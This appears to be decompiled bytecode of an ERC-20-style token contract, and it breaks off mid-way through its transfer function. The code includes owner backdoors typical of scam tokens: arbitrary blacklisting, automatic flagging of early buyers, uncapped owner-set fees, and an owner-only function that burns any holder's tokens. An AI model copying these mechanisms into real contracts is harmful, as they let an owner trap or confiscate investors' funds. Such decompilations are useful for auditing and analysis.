contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
address owner;
mapping of uint256 _balances;
mapping of uint256 _allowances;
uint256 _totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address uniswapV2RouterAddress; offset 8
address uniswapV2PairAddress;
address deadWalletAddress;
address marketAddress;
address sub_4b338a6cAddress;
address USDTAddress;
mapping of uint8 stor12;
uint8 stor13;
uint256 stor14;
uint256 totalBurn;
uint256 stor16;
uint256 launchedAt;
uint256 stor18;
uint256 stor19;
uint8 stor20;
mapping of uint8 stor21;

function _allowances(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return _allowances[arg1][arg2]
}

function name() {
    return name[0 len name.length]
}

function uniswapV2Router() {
    return uniswapV2RouterAddress
}

function totalSupply() {
    return _totalSupply
}

function decimals() {
    return decimals
}

function totalBurn() {
    return totalBurn
}

function _totalSupply() {
    return _totalSupply
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function sub_4b338a6c(?) {
    return sub_4b338a6cAddress
}

function _balances(address arg1) {
    require calldata.size - 4 >= 32
    return _balances[arg1]
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return _balances[address(arg1)]
}

function market() {
    return marketAddress
}

function deadWallet() {
    return deadWalletAddress
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function isLocked() {
    return bool(stor13)
}

function sub_a6c152b7(?) {
    require calldata.size - 4 >= 32
    return bool(stor12[arg1])
}

function launchedAt() {
    return launchedAt
}

function USDT() {
    return USDTAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return _allowances[address(arg1)][address(arg2)]
}

function _isExcludedFromFees(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor21[arg1])
}

function _fallback() payable {
    revert
}

function renounceOwnership() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function sub_ba440db1(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor20 = uint8(arg1)
}

function setLunchTime(uint256 arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor18 = arg1
}

function sub_28834596(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor14 = arg1
    stor16 = arg2
}

function sub_220997ea(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    marketAddress = arg1
    sub_4b338a6cAddress = arg2
}

function isbookAddress(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor12[address(arg1)] = uint8(arg2)
}

function setExcludedFromFees(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor21[address(arg1)] = uint8(arg2)
}

function sub_8c76dc93(?) {
    require calldata.size - 4 >= 96
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args address(arg3), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x654f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    _allowances[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_8fda4ed8(?) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6545524332303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if 10^9 * arg2 > _balances[address(arg1)]:
        revert with 0, 32, 34, 0x7345524332303a206275726e20616d6f756e7420657863656564732062616c616e63, mem[162 len 30], mem[222 len 2]
    _balances[address(arg1)] += -1 * 10^9 * arg2
    if 10^9 * arg2 > _totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    _totalSupply += -1 * 10^9 * arg2
    emit Transfer((10^9 * arg2), arg1, 0);
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > _allowances[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    _allowances[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((_allowances[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if _allowances[address(msg.sender)][address(arg1)] + arg2 < _allowances[address(msg.sender)][address(arg1)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    _allowances[address(msg.sender)][address(arg1)] += arg2
    emit Approval((_allowances[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function swap(uint256 arg1) {
    require calldata.size - 4 >= 32
    if stor13:
        revert with 0, 'Token Smart contract is locked'
    require ext_code.size(this.address)
    call this.address.0x23b872dd with:
         gas gas_remaining wei
        args msg.sender, address(this.address), arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not arg1:
        require ext_code.size(USDTAddress)
        call USDTAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, 0
    else:
        require arg1
        if arg1 / arg1 != 1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        require ext_code.size(USDTAddress)
        call USDTAddress.0xa9059cbb with:
             gas gas_remaining wei
            args msg.sender, arg1 / 10
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function sub_2de56fd2(?) payable {
    mem[64] = 96
    require not msg.value
    require calldata.size - 4 >= 64
    require cd[4] <= 4294967296
    require cd[4] + 36 <= calldata.size
    require ('cd', 4).length <= 4294967296 and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    idx = 0
    while idx < ('cd', 4).length:
        _17 = mem[64]
        mem[64] = mem[64] + 96
        mem[_17] = 38
        mem[_17 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
        mem[32] = 1
        if cd[36] > _balances[address(msg.sender)]:
            _19 = mem[64]
            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[mem[64] + 4] = 32
            mem[mem[64] + 36] = 38
            idx = 0
            while idx < 38:
                mem[_19 + idx + 68] = mem[_17 + idx + 32]
                idx = idx + 32
                continue 
            mem[_19 + 100] = mem[_19 + 126 len 6]
            revert with memory
              from mem[64]
               len _19 + -mem[64] + 132
        _balances[address(msg.sender)] -= cd[36]
        if _balances[address(cd[((32 * idx) + cd[4] + 36)])] + cd[36] < _balances[address(cd[((32 * idx) + cd[4] + 36)])]:
            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[mem[64] + 104 len 28]
        mem[0] = address(cd[((32 * idx) + cd[4] + 36)])
        mem[32] = 1
        _balances[address(cd[((32 * idx) + cd[4] + 36)])] += cd[36]
        mem[mem[64]] = cd[36]
        emit Transfer(cd[36], msg.sender, address(cd[((32 * idx) + cd[4] + 36)]));
        idx = idx + 1
        continue 
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > _balances[address(msg.sender)] / 100:
        if stor12[address(msg.sender)]:
            revert with 0, 'isbook address'
        if stor12[address(arg1)]:
            revert with 0, 'isbook address'
    if launchedAt + stor18 >= block.number:
        if arg1 != uniswapV2PairAddress:
            stor12[address(arg1)] = 1
    if not launchedAt:
        if arg1 == uniswapV2PairAddress:
            require _balances[address(msg.sender)] > 0
            launchedAt = block.number
            stor19 = block.timestamp
    if not arg2:
        if not msg.sender:
            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
        if not arg1:
            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
        if 0 > _balances[address(msg.sender)]:
            revert with 0, 
                        32,
                        38,
                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[230 len 26],
                        mem[282 len 6]
        if _balances[address(arg1)] < _balances[address(arg1)]:
            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
        emit Transfer(0, msg.sender, arg1);
    else:
        if stor21[address(msg.sender)]:
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
            if not arg1:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
            if arg2 > _balances[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[230 len 26],
                            mem[282 len 6]
            _balances[address(msg.sender)] -= arg2
            if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
            _balances[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
            if not arg1:
                if totalBurn + arg2 < totalBurn:
                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
                totalBurn += arg2
                if arg2 > _totalSupply:
                    revert with 0, 'SafeMath: subtraction overflow'
                _totalSupply -= arg2
            else:
                if arg1 == deadWalletAddress:
                    if totalBurn + arg2 < totalBurn:
                        revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
                    totalBurn += arg2
                    if arg2 > _totalSupply:
                        revert with 0, 'SafeMath: subtraction overflow'
                    _totalSupply -= arg2
        else:
            if stor21[address(arg1)]:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not arg1:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                if arg2 > _balances[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[230 len 26],
                                mem[282 len 6]
                _balances[address(msg.sender)] -= arg2
                if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
                _balances[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
                if not arg1:
                    if totalBurn + arg2 < totalBurn:
                        revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
                    totalBurn += arg2
                    if arg2 > _totalSupply:
                        revert with 0, 'SafeMath: subtraction overflow'
                    _totalSupply -= arg2
                else:
                    if arg1 == deadWalletAddress:
                        if totalBurn + arg2 < totalBurn:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[360 len 28]
                        totalBurn += arg2
                        if arg2 > _totalSupply:
                            revert with 0, 'SafeMath: subtraction overflow'
                        _totalSupply -= arg2
            else:
                if arg1 != uniswapV2PairAddress:
                    if not arg2:
                        if 0 > arg2:
                            revert with 0, 'SafeMath: subtraction overflow'
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                        if not marketAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[422 len 26],
                                        mem[474 len 6]
                        if _balances[stor9] < _balances[stor9]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                        emit Transfer(0, msg.sender, marketAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[617 len 27]
                        if not sub_4b338a6cAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[615 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[582 len 26],
                                        mem[634 len 6]
                        if _balances[stor10] < _balances[stor10]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[712 len 28]
                        emit Transfer(0, msg.sender, sub_4b338a6cAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[713 len 27]
                        if not arg1:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[711 len 29]
                        if arg2 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[678 len 26],
                                        mem[730 len 6]
                        _balances[address(msg.sender)] -= arg2
                        if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                        _balances[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        if not arg1:
                            if totalBurn + arg2 < totalBurn:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                            totalBurn += arg2
                            if arg2 > _totalSupply:
                                revert with 0, 'SafeMath: subtraction overflow'
                            _totalSupply -= arg2
                        else:
                            if arg1 == deadWalletAddress:
                                if totalBurn + arg2 < totalBurn:
                                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                                totalBurn += arg2
                                if arg2 > _totalSupply:
                                    revert with 0, 'SafeMath: subtraction overflow'
                                _totalSupply -= arg2
                    else:
                        require arg2
                        if arg2 * stor14 / arg2 != stor14:
                            revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                        if arg2 * stor14 / 100 > arg2:
                            revert with 0, 'SafeMath: subtraction overflow'
                        if not arg2 * stor14 / 100:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                            if not marketAddress:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                            if 0 > _balances[address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[422 len 26],
                                            mem[474 len 6]
                            if _balances[stor9] < _balances[stor9]:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                            emit Transfer(0, msg.sender, marketAddress);
                        else:
                            require arg2 * stor14 / 100
                            if 8 * arg2 * stor14 / 100 / arg2 * stor14 / 100 != 8:
                                revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[389 len 31]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                            if not marketAddress:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                            if Mask(253, 0, arg2 * stor14 / 100) > _balances[address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[422 len 26],
                                            mem[474 len 6]
                            _balances[address(msg.sender)] -= Mask(253, 0, arg2 * stor14 / 100)
                            if _balances[stor9] + Mask(253, 0, arg2 * stor14 / 100) < _balances[stor9]:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                            _balances[stor9] += Mask(253, 0, arg2 * stor14 / 100)
                            emit Transfer(Mask(253, 0, arg2 * stor14 / 100), msg.sender, marketAddress);
                        if arg2 * stor14 / 100:
                            require arg2 * stor14 / 100
                            if 0 / arg2 * stor14 / 100:
                                revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[549 len 31]
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[617 len 27]
                        if not sub_4b338a6cAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[615 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[582 len 26],
                                        mem[634 len 6]
                        if _balances[stor10] < _balances[stor10]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[712 len 28]
                        emit Transfer(0, msg.sender, sub_4b338a6cAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[713 len 27]
                        if not arg1:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[711 len 29]
                        if arg2 - (arg2 * stor14 / 100) > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[678 len 26],
                                        mem[730 len 6]
                        _balances[address(msg.sender)] = _balances[address(msg.sender)] - arg2 + (arg2 * stor14 / 100)
                        if _balances[address(arg1)] + arg2 - (arg2 * stor14 / 100) < _balances[address(arg1)]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                        _balances[address(arg1)] = _balances[address(arg1)] + arg2 - (arg2 * stor14 / 100)
                        emit Transfer((arg2 - (arg2 * stor14 / 100)), msg.sender, arg1);
                        if not arg1:
                            if totalBurn + arg2 - (arg2 * stor14 / 100) < totalBurn:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                            totalBurn = totalBurn + arg2 - (arg2 * stor14 / 100)
                            if arg2 - (arg2 * stor14 / 100) > _totalSupply:
                                revert with 0, 'SafeMath: subtraction overflow'
                            _totalSupply = _totalSupply - arg2 + (arg2 * stor14 / 100)
                        else:
                            if arg1 == deadWalletAddress:
                                if totalBurn + arg2 - (arg2 * stor14 / 100) < totalBurn:
                                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                                totalBurn = totalBurn + arg2 - (arg2 * stor14 / 100)
                                if arg2 - (arg2 * stor14 / 100) > _totalSupply:
                                    revert with 0, 'SafeMath: subtraction overflow'
                                _totalSupply = _totalSupply - arg2 + (arg2 * stor14 / 100)
                else:
                    if not arg2:
                        if 0 > arg2:
                            revert with 0, 'SafeMath: subtraction overflow'
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                        if not marketAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[422 len 26],
                                        mem[474 len 6]
                        if _balances[stor9] < _balances[stor9]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                        emit Transfer(0, msg.sender, marketAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[617 len 27]
                        if not sub_4b338a6cAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[615 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[582 len 26],
                                        mem[634 len 6]
                        if _balances[stor10] < _balances[stor10]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[712 len 28]
                        emit Transfer(0, msg.sender, sub_4b338a6cAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[713 len 27]
                        if not arg1:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[711 len 29]
                        if arg2 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[678 len 26],
                                        mem[730 len 6]
                        _balances[address(msg.sender)] -= arg2
                        if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                        _balances[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        if not arg1:
                            if totalBurn + arg2 < totalBurn:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                            totalBurn += arg2
                            if arg2 > _totalSupply:
                                revert with 0, 'SafeMath: subtraction overflow'
                            _totalSupply -= arg2
                        else:
                            if arg1 == deadWalletAddress:
                                if totalBurn + arg2 < totalBurn:
                                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                                totalBurn += arg2
                                if arg2 > _totalSupply:
                                    revert with 0, 'SafeMath: subtraction overflow'
                                _totalSupply -= arg2
                    else:
                        require arg2
                        if arg2 * stor16 / arg2 != stor16:
                            revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                        if arg2 * stor16 / 100 > arg2:
                            revert with 0, 'SafeMath: subtraction overflow'
                        if not arg2 * stor16 / 100:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                            if not marketAddress:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                            if 0 > _balances[address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[422 len 26],
                                            mem[474 len 6]
                            if _balances[stor9] < _balances[stor9]:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                            emit Transfer(0, msg.sender, marketAddress);
                        else:
                            require arg2 * stor16 / 100
                            if 8 * arg2 * stor16 / 100 / arg2 * stor16 / 100 != 8:
                                revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[389 len 31]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[457 len 27]
                            if not marketAddress:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[455 len 29]
                            if Mask(253, 0, arg2 * stor16 / 100) > _balances[address(msg.sender)]:
                                revert with 0, 
                                            32,
                                            38,
                                            0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                            mem[422 len 26],
                                            mem[474 len 6]
                            _balances[address(msg.sender)] -= Mask(253, 0, arg2 * stor16 / 100)
                            if _balances[stor9] + Mask(253, 0, arg2 * stor16 / 100) < _balances[stor9]:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[552 len 28]
                            _balances[stor9] += Mask(253, 0, arg2 * stor16 / 100)
                            emit Transfer(Mask(253, 0, arg2 * stor16 / 100), msg.sender, marketAddress);
                        if arg2 * stor16 / 100:
                            require arg2 * stor16 / 100
                            if 0 / arg2 * stor16 / 100:
                                revert with 0, 32, 33, 0x6e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[549 len 31]
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[617 len 27]
                        if not sub_4b338a6cAddress:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[615 len 29]
                        if 0 > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[582 len 26],
                                        mem[634 len 6]
                        if _balances[stor10] < _balances[stor10]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[712 len 28]
                        emit Transfer(0, msg.sender, sub_4b338a6cAddress);
                        if not msg.sender:
                            revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[713 len 27]
                        if not arg1:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[711 len 29]
                        if arg2 - (arg2 * stor16 / 100) > _balances[address(msg.sender)]:
                            revert with 0, 
                                        32,
                                        38,
                                        0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                        mem[678 len 26],
                                        mem[730 len 6]
                        _balances[address(msg.sender)] = _balances[address(msg.sender)] - arg2 + (arg2 * stor16 / 100)
                        if _balances[address(arg1)] + arg2 - (arg2 * stor16 / 100) < _balances[address(arg1)]:
                            revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                        _balances[address(arg1)] = _balances[address(arg1)] + arg2 - (arg2 * stor16 / 100)
                        emit Transfer((arg2 - (arg2 * stor16 / 100)), msg.sender, arg1);
                        if not arg1:
                            if totalBurn + arg2 - (arg2 * stor16 / 100) < totalBurn:
                                revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                            totalBurn = totalBurn + arg2 - (arg2 * stor16 / 100)
                            if arg2 - (arg2 * stor16 / 100) > _totalSupply:
                                revert with 0, 'SafeMath: subtraction overflow'
                            _totalSupply = _totalSupply - arg2 + (arg2 * stor16 / 100)
                        else:
                            if arg1 == deadWalletAddress:
                                if totalBurn + arg2 - (arg2 * stor16 / 100) < totalBurn:
                                    revert with 0, 32, 36, 0x65536166654d6174683a206164646974696f6e206f766572666c6f7720616e616e616e61, mem[808 len 28]
                                totalBurn = totalBurn + arg2 - (arg2 * stor16 / 100)
                                if arg2 - (arg2 * stor16 / 100) > _totalSupply:
                                    revert with 0, 'SafeMath: subtraction overflow'
